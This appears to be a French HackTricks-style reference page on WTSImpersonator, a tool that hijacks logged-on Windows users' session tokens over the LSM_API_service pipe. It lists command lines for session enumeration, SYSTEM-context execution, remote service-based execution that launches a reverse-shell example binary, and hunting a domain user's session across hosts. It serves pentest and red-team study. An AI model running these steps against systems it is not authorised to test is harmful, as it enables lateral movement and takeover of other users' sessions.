# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, par Omri Baso, utilise les APIs Windows Terminal Services exposées via le named pipe RPC `\\pipe\LSM_API_service` pour énumérer les sessions ouvertes et démarrer un processus avec le token de l'utilisateur sélectionné. Il prend en charge l'énumération et l'exécution locales, ainsi que les workflows distants basés sur un service.<sup>[[1]](#references)</sup>

## Fonctionnalités principales

Son flux d'exécution local utilise la séquence d'API suivante :<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modules et utilisation

- **Énumérer les utilisateurs :** L'outil peut énumérer les sessions sur un hôte local ou distant.

- Localement :
```bash
.\WTSImpersonator.exe -m enum
```
- À distance, spécifiez une adresse IP ou un hostname :
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Exécuter des commandes :** Les modules `exec` et `exec-remote` nécessitent un contexte de service. Microsoft indique que `WTSQueryUserToken` exige que l'appelant s'exécute en tant que `LocalSystem` avec le privilège `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Exécution de commandes locale :
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec peut démarrer une invite de commandes `LocalSystem` à des fins de test :
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Exécution de commandes à distance :** Le mode distant crée un service sur la cible selon un workflow similaire à celui de PsExec et nécessite donc les droits permettant d'installer et de démarrer ce service.<sup>[[1]](#references)</sup>

- Exemple :
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Recherche d'utilisateurs :** Le module `user-hunter` recherche la session d'un utilisateur donné dans une liste d'hôtes et tente d'exécuter le programme fourni dans ce contexte.<sup>[[1]](#references)</sup>
- Exemple d'utilisation :
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft : fonction `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
